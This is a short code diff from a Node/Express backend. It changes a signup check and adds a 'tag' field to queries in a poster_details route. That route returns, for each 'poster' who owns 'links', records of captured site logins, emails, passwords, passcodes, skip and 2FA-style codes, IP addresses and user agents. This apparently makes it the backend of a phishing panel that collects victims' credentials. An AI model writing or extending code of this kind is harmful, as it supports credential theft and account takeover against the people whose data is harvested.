@@ -71,9 +71,11 @@ export const signup_post = async (req, res) => {
     if (user) {
       return res.status(400).json({ error: "user exists yes" });
     }
-    const foundWithAdminId = await User.findOne({ adminId: adminId });
-    if (foundWithAdminId) {
-      return res.status(400).json({ error: "id exists" });
+    if (adminId) {
+      const foundWithAdminId = await User.findOne({ adminId: adminId });
+      if (foundWithAdminId) {
+        return res.status(400).json({ error: "id exists" });
+      }
     }
     const userCreated = await User.create({
       password,
@@ -611,12 +613,12 @@ export const poster_details = async (req, res) => {
 
   try {
     const poster = await Poster.findOne({ _id: id }).select(
-      "username password posterId links createdAt",
+      "username password posterId links createdAt tag",
     );
 
     const details = await Info.find({ root: id })
       .select(
-        "site mail passcode skipcode email password gCode ip agent status number createdAt",
+        "site mail passcode skipcode email password tag gCode ip agent status number createdAt ",
       )
       .sort({ createdAt: -1 });
     // const newdata = {...poster, details: details }
